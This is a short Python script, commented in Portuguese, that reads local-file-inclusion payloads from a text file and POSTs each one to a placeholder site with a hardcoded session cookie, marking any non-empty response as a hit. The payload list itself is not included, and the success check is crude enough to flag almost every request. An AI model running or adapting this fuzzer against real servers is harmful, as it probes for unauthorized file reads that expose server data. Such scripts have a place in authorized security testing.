#!/usr/bin/python

#importanto bibliotecas
import requests

#lendo o arquivo com os payloads
file = open('payloadlist.txt','r')
conteudo = file.readlines()

cont = 1

#percorrendo o arquivo
for lfi in conteudo:

    #set do alvo
    url = "https://target.com.br"

    payload={'request': lfi.strip()}
    files=[

    ]
    headers = {
    'Cookie': 'PHPSESSID=gtutm1q16tthnf29ceb3247qmj'
    }

    #enviando requisicao
    response = requests.request("POST", url, headers=headers, data=payload, files=files)
    size = len(response.text)

    #validando sucesso
    if(size > 0):
        print(str(cont) + ". [OK] -> " + str(lfi.strip()))
    else:
        pass

    cont = cont + 1

print("Concluido")
